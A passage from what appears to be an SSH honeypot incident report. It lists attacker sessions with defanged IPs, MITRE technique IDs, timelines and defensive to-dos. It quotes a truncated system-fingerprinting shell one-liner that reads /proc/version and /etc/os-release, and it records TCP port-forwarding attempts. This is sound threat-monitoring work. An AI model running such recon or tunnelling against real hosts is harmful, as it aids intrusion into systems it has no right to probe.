| `2026-07-19 05:14:42` | `cowrie.command.input` |
| `2026-07-19 05:14:42` | `cowrie.command.input` |
| `2026-07-19 05:14:42` | `cowrie.command.input` |
| `2026-07-19 05:14:42` | `cowrie.log.closed` |
| `2026-07-19 05:14:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]50` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]50` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-77f0d109bf04

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]14` |
| **First Seen** | 2026-07-19 05:15 |
| **Last Seen** | 2026-07-19 05:15 |
| **Session Duration** | 47s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 05:15:01` | `cowrie.session.connect` |
| `2026-07-19 05:15:05` | `cowrie.client.version` |
| `2026-07-19 05:15:05` | `cowrie.client.kex` |
| `2026-07-19 05:15:25` | `cowrie.login.success` |
| `2026-07-19 05:15:39` | `cowrie.session.params` |
| `2026-07-19 05:15:39` | `cowrie.command.input` |
| `2026-07-19 05:15:48` | `cowrie.log.closed` |
| `2026-07-19 05:15:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]14` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f7f21cc39303

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]14` |
| **First Seen** | 2026-07-19 05:15 |
| **Last Seen** | 2026-07-19 05:16 |
| **Session Duration** | 56s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 05:15:12` | `cowrie.session.connect` |
| `2026-07-19 05:15:16` | `cowrie.client.version` |
| `2026-07-19 05:15:16` | `cowrie.client.kex` |
| `2026-07-19 05:15:47` | `cowrie.login.success` |
| `2026-07-19 05:16:01` | `cowrie.session.params` |
| `2026-07-19 05:16:01` | `cowrie.command.input` |
| `2026-07-19 05:16:09` | `cowrie.log.closed` |
| `2026-07-19 05:16:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]14` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a1be229fd252

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]14` |
| **First Seen** | 2026-07-19 05:15 |
| **Last Seen** | 2026-07-19 05:16 |
| **Session Duration** | 61s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 05:15:19` | `cowrie.session.connect` |
| `2026-07-19 05:15:27` | `cowrie.client.version` |
| `2026-07-19 05:15:27` | `cowrie.client.kex` |
| `2026-07-19 05:15:55` | `cowrie.login.success` |
| `2026-07-19 05:16:13` | `cowrie.session.params` |
| `2026-07-19 05:16:13` | `cowrie.command.input` |
| `2026-07-19 05:16:20` | `cowrie.log.closed` |
| `2026-07-19 05:16:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]14` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5d91bbe4b7a0

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]14` |
| **First Seen** | 2026-07-19 05:15 |
| **Last Seen** | 2026-07-19 05:16 |
| **Session Duration** | 65s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 05:15:36` | `cowrie.session.connect` |
| `2026-07-19 05:15:46` | `cowrie.client.version` |
| `2026-07-19 05:15:46` | `cowrie.client.kex` |
| `2026-07-19 05:16:15` | `cowrie.login.success` |
| `2026-07-19 05:16:31` | `cowrie.session.params` |
| `2026-07-19 05:16:31` | `cowrie.command.input` |
| `2026-07-19 05:16:42` | `cowrie.log.closed` |
| `2026-07-19 05:16:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]14` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-206356048d6a

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]14` |
| **First Seen** | 2026-07-19 05:15 |
| **Last Seen** | 2026-07-19 05:16 |
| **Session Duration** | 58s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 05:15:55` | `cowrie.session.connect` |
| `2026-07-19 05:16:01` | `cowrie.client.version` |
| `2026-07-19 05:16:01` | `cowrie.client.kex` |
| `2026-07-19 05:16:35` | `cowrie.login.success` |
| `2026-07-19 05:16:51` | `cowrie.session.params` |
| `2026-07-19 05:16:51` | `cowrie.command.input` |
| `2026-07-19 05:16:53` | `cowrie.log.closed` |
| `2026-07-19 05:16:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]14` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b981c2fd087a

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]14` |
| **First Seen** | 2026-07-19 05:16 |
| **Last Seen** | 2026-07-19 05:16 |
| **Session Duration** | 41s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 05:16:14` | `cowrie.session.connect` |
| `2026-07-19 05:16:21` | `cowrie.client.version` |
| `2026-07-19 05:16:21` | `cowrie.client.kex` |
| `2026-07-19 05:16:51` | `cowrie.login.success` |
| `2026-07-19 05:16:54` | `cowrie.session.params` |
| `2026-07-19 05:16:54` | `cowrie.command.input` |
| `2026-07-19 05:16:55` | `cowrie.log.closed` |
| `2026-07-19 05:16:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]14` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2caf066e6022

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]14` |
| **First Seen** | 2026-07-19 05:16 |
| **Last Seen** | 2026-07-19 05:16 |
| **Session Duration** | 33s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 05:16:21` | `cowrie.session.connect` |
| `2026-07-19 05:16:29` | `cowrie.client.version` |
| `2026-07-19 05:16:29` | `cowrie.client.kex` |
| `2026-07-19 05:16:53` | `cowrie.login.success` |
| `2026-07-19 05:16:55` | `cowrie.session.params` |
| `2026-07-19 05:16:55` | `cowrie.command.input` |
| `2026-07-19 05:16:55` | `cowrie.log.closed` |
| `2026-07-19 05:16:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]14` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5e8d19c7ca55

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]50` |
| **First Seen** | 2026-07-19 05:16 |
| **Last Seen** | 2026-07-19 05:16 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 05:16:28` | `cowrie.session.connect` |
| `2026-07-19 05:16:29` | `cowrie.client.version` |
| `2026-07-19 05:16:29` | `cowrie.client.kex` |
| `2026-07-19 05:16:30` | `cowrie.login.success` |
| `2026-07-19 05:16:32` | `cowrie.session.params` |
| `2026-07-19 05:16:32` | `cowrie.command.input` |
| `2026-07-19 05:16:32` | `cowrie.command.input` |
| `2026-07-19 05:16:32` | `cowrie.command.input` |
| `2026-07-19 05:16:32` | `cowrie.command.input` |
| `2026-07-19 05:16:32` | `cowrie.command.input` |
| `2026-07-19 05:16:32` | `cowrie.command.success` |
| `2026-07-19 05:16:32` | `cowrie.command.input` |
| `2026-07-19 05:16:32` | `cowrie.command.input` |
| `2026-07-19 05:16:32` | `cowrie.command.input` |
| `2026-07-19 05:16:32` | `cowrie.command.input` |
| `2026-07-19 05:16:32` | `cowrie.log.closed` |
| `2026-07-19 05:16:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]50` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]50` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7e515136eba2

| Field | Detail |
|---|---|
| **Source IP** | `207.175.116[.]89` |
| **First Seen** | 2026-07-19 05:16 |
| **Last Seen** | 2026-07-19 05:17 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 05:16:58` | `cowrie.session.connect` |
| `2026-07-19 05:16:58` | `cowrie.client.version` |
| `2026-07-19 05:16:58` | `cowrie.client.kex` |
| `2026-07-19 05:17:00` | `cowrie.login.success` |
| `2026-07-19 05:17:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `207.175.116[.]89` to AbuseIPDB if not already reported
- [ ] Block `207.175.116[.]89` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5971417e720d

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]50` |
| **First Seen** | 2026-07-19 05:18 |
| **Last Seen** | 2026-07-19 05:18 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 05:18:16` | `cowrie.session.connect` |
| `2026-07-19 05:18:17` | `cowrie.client.version` |
| `2026-07-19 05:18:17` | `cowrie.client.kex` |
| `2026-07-19 05:18:18` | `cowrie.login.success` |
| `2026-07-19 05:18:20` | `cowrie.session.params` |
| `2026-07-19 05:18:20` | `cowrie.command.input` |
| `2026-07-19 05:18:20` | `cowrie.command.input` |
| `2026-07-19 05:18:20` | `cowrie.command.input` |
| `2026-07-19 05:18:20` | `cowrie.command.input` |
| `2026-07-19 05:18:20` | `cowrie.command.input` |
| `2026-07-19 05:18:20` | `cowrie.command.success` |
| `2026-07-19 05:18:20` | `cowrie.command.input` |
| `2026-07-19 05:18:20` | `cowrie.command.input` |
| `2026-07-19 05:18:20` | `cowrie.command.input` |
| `2026-07-19 05:18:20` | `cowrie.command.input` |
| `2026-07-19 05:18:20` | `cowrie.log.closed` |
| `2026-07-19 05:18:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]50` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]50` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-914b5aff9a98

| Field | Detail |
|---|---|
| **Source IP** | `178.178.194[.]131` |
| **First Seen** | 2026-07-19 05:18 |
| **Last Seen** | 2026-07-19 05:19 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 05:18:54` | `cowrie.session.connect` |
| `2026-07-19 05:18:55` | `cowrie.client.version` |
| `2026-07-19 05:18:55` | `cowrie.client.kex` |
| `2026-07-19 05:18:56` | `cowrie.login.success` |
| `2026-07-19 05:18:56` | `cowrie.direct-tcpip.request` |
| `2026-07-19 05:19:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `178.178.194[.]131` to AbuseIPDB if not already reported
- [ ] Block `178.178.194[.]131` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8b465e12f215

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]50` |
| **First Seen** | 2026-07-19 05:20 |
| **Last Seen** | 2026-07-19 05:20 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 05:20:06` | `cowrie.session.connect` |
| `2026-07-19 05:20:07` | `cowrie.client.version` |
| `2026-07-19 05:20:07` | `cowrie.client.kex` |
| `2026-07-19 05:20:08` | `cowrie.login.success` |
| `2026-07-19 05:20:09` | `cowrie.session.params` |
| `2026-07-19 05:20:09` | `cowrie.command.input` |
| `2026-07-19 05:20:09` | `cowrie.command.input` |
| `2026-07-19 05:20:09` | `cowrie.command.input` |
| `2026-07-19 05:20:09` | `cowrie.command.input` |
| `2026-07-19 05:20:09` | `cowrie.command.input` |
| `2026-07-19 05:20:09` | `cowrie.command.success` |
| `2026-07-19 05:20:09` | `cowrie.command.input` |
| `2026-07-19 05:20:09` | `cowrie.command.input` |
| `2026-07-19 05:20:09` | `cowrie.command.input` |
| `2026-07-19 05:20:09` | `cowrie.command.input` |
| `2026-07-19 05:20:10` | `cowrie.log.closed` |
| `2026-07-19 05:20:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]50` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]50` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-437736079b1d

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]50` |
| **First Seen** | 2026-07-19 05:21 |
| **Last Seen** | 2026-07-19 05:22 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 05:21:56` | `cowrie.session.connect` |
| `2026-07-19 05:21:57` | `cowrie.client.version` |
| `2026-07-19 05:21:57` | `cowrie.client.kex` |
| `2026-07-19 05:21:59` | `cowrie.login.success` |
| `2026-07-19 05:22:00` | `cowrie.session.params` |
| `2026-07-19 05:22:00` | `cowrie.command.input` |
| `2026-07-19 05:22:00` | `cowrie.command.input` |
| `2026-07-19 05:22:00` | `cowrie.command.input` |
| `2026-07-19 05:22:00` | `cowrie.command.input` |
| `2026-07-19 05:22:00` | `cowrie.command.input` |
| `2026-07-19 05:22:00` | `cowrie.command.success` |
| `2026-07-19 05:22:00` | `cowrie.command.input` |
| `2026-07-19 05:22:00` | `cowrie.command.input` |
| `2026-07-19 05:22:00` | `cowrie.command.input` |
| `2026-07-19 05:22:00` | `cowrie.command.input` |
| `2026-07-19 05:22:00` | `cowrie.log.closed` |
| `2026-07-19 05:22:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]50` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]50` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d377cee4687d

| Field | Detail |
|---|---|
| **Source IP** | `102.38.3[.]107` |
| **First Seen** | 2026-07-19 05:22 |
| **Last Seen** | 2026-07-19 05:22 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 05:22:00` | `cowrie.session.connect` |
| `2026-07-19 05:22:00` | `cowrie.client.version` |
| `2026-07-19 05:22:00` | `cowrie.client.kex` |
| `2026-07-19 05:22:02` | `cowrie.login.success` |
| `2026-07-19 05:22:02` | `cowrie.direct-tcpip.request` |
| `2026-07-19 05:22:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.38.3[.]107` to AbuseIPDB if not already reported
- [ ] Block `102.38.3[.]107` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2f90764af0ee

| Field | Detail |
|---|---|
| **Source IP** | `221.120.4[.]61` |
| **First Seen** | 2026-07-19 05:22 |
| **Last Seen** | 2026-07-19 05:22 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 05:22:08` | `cowrie.session.connect` |
| `2026-07-19 05:22:08` | `cowrie.client.version` |
| `2026-07-19 05:22:08` | `cowrie.client.kex` |
| `2026-07-19 05:22:11` | `cowrie.login.success` |
| `2026-07-19 05:22:11` | `cowrie.direct-tcpip.request` |
| `2026-07-19 05:22:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `221.120.4[.]61` to AbuseIPDB if not already reported
- [ ] Block `221.120.4[.]61` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-708d2c019cd7

| Field | Detail |
|---|---|
| **Source IP** | `183.167.217[.]86` |
| **First Seen** | 2026-07-19 05:22 |
| **Last Seen** | 2026-07-19 05:22 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 05:22:28` | `cowrie.session.connect` |
| `2026-07-19 05:22:30` | `cowrie.client.version` |
| `2026-07-19 05:22:30` | `cowrie.client.kex` |
| `2026-07-19 05:22:32` | `cowrie.login.success` |
| `2026-07-19 05:22:34` | `cowrie.direct-tcpip.request` |
| `2026-07-19 05:22:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `183.167.217[.]86` to AbuseIPDB if not already reported
- [ ] Block `183.167.217[.]86` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-32c2b40258ea

| Field | Detail |
|---|---|
| **Source IP** | `125.35.109[.]214` |
| **First Seen** | 2026-07-19 05:22 |
| **Last Seen** | 2026-07-19 05:22 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 05:22:40` | `cowrie.session.connect` |
| `2026-07-19 05:22:41` | `cowrie.client.version` |
| `2026-07-19 05:22:41` | `cowrie.client.kex` |
| `2026-07-19 05:22:43` | `cowrie.login.success` |
| `2026-07-19 05:22:44` | `cowrie.direct-tcpip.request` |
| `2026-07-19 05:22:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `125.35.109[.]214` to AbuseIPDB if not already reported
- [ ] Block `125.35.109[.]214` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ec19363c3c17

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]50` |
| **First Seen** | 2026-07-19 05:23 |
| **Last Seen** | 2026-07-19 05:23 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 05:23:45` | `cowrie.session.connect` |
| `2026-07-19 05:23:46` | `cowrie.client.version` |
| `2026-07-19 05:23:46` | `cowrie.client.kex` |
| `2026-07-19 05:23:47` | `cowrie.login.success` |
| `2026-07-19 05:23:48` | `cowrie.session.params` |
| `2026-07-19 05:23:48` | `cowrie.command.input` |
| `2026-07-19 05:23:48` | `cowrie.command.input` |
| `2026-07-19 05:23:48` | `cowrie.command.input` |
| `2026-07-19 05:23:48` | `cowrie.command.input` |
| `2026-07-19 05:23:48` | `cowrie.command.input` |
| `2026-07-19 05:23:48` | `cowrie.command.success` |
| `2026-07-19 05:23:48` | `cowrie.command.input` |
| `2026-07-19 05:23:48` | `cowrie.command.input` |
| `2026-07-19 05:23:48` | `cowrie.command.input` |
| `2026-07-19 05:23:48` | `cowrie.command.input` |
| `2026-07-19 05:23:48` | `cowrie.log.closed` |
| `2026-07-19 05:23:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]50` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]50` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e59cac77dd9a

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]50` |
| **First Seen** | 2026-07-19 05:25 |
| **Last Seen** | 2026-07-19 05:25 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 05:25:34` | `cowrie.session.connect` |
| `2026-07-19 05:25:34` | `cowrie.client.version` |
| `2026-07-19 05:25:34` | `cowrie.client.kex` |
| `2026-07-19 05:25:35` | `cowrie.login.success` |
| `2026-07-19 05:25:37` | `cowrie.session.params` |
| `2026-07-19 05:25:37` | `cowrie.command.input` |
| `2026-07-19 05:25:37` | `cowrie.command.input` |
| `2026-07-19 05:25:37` | `cowrie.command.input` |
| `2026-07-19 05:25:37` | `cowrie.command.input` |
| `2026-07-19 05:25:37` | `cowrie.command.input` |
| `2026-07-19 05:25:37` | `cowrie.command.success` |
| `2026-07-19 05:25:37` | `cowrie.command.input` |
| `2026-07-19 05:25:37` | `cowrie.command.input` |
| `2026-07-19 05:25:37` | `cowrie.command.input` |
| `2026-07-19 05:25:37` | `cowrie.command.input` |
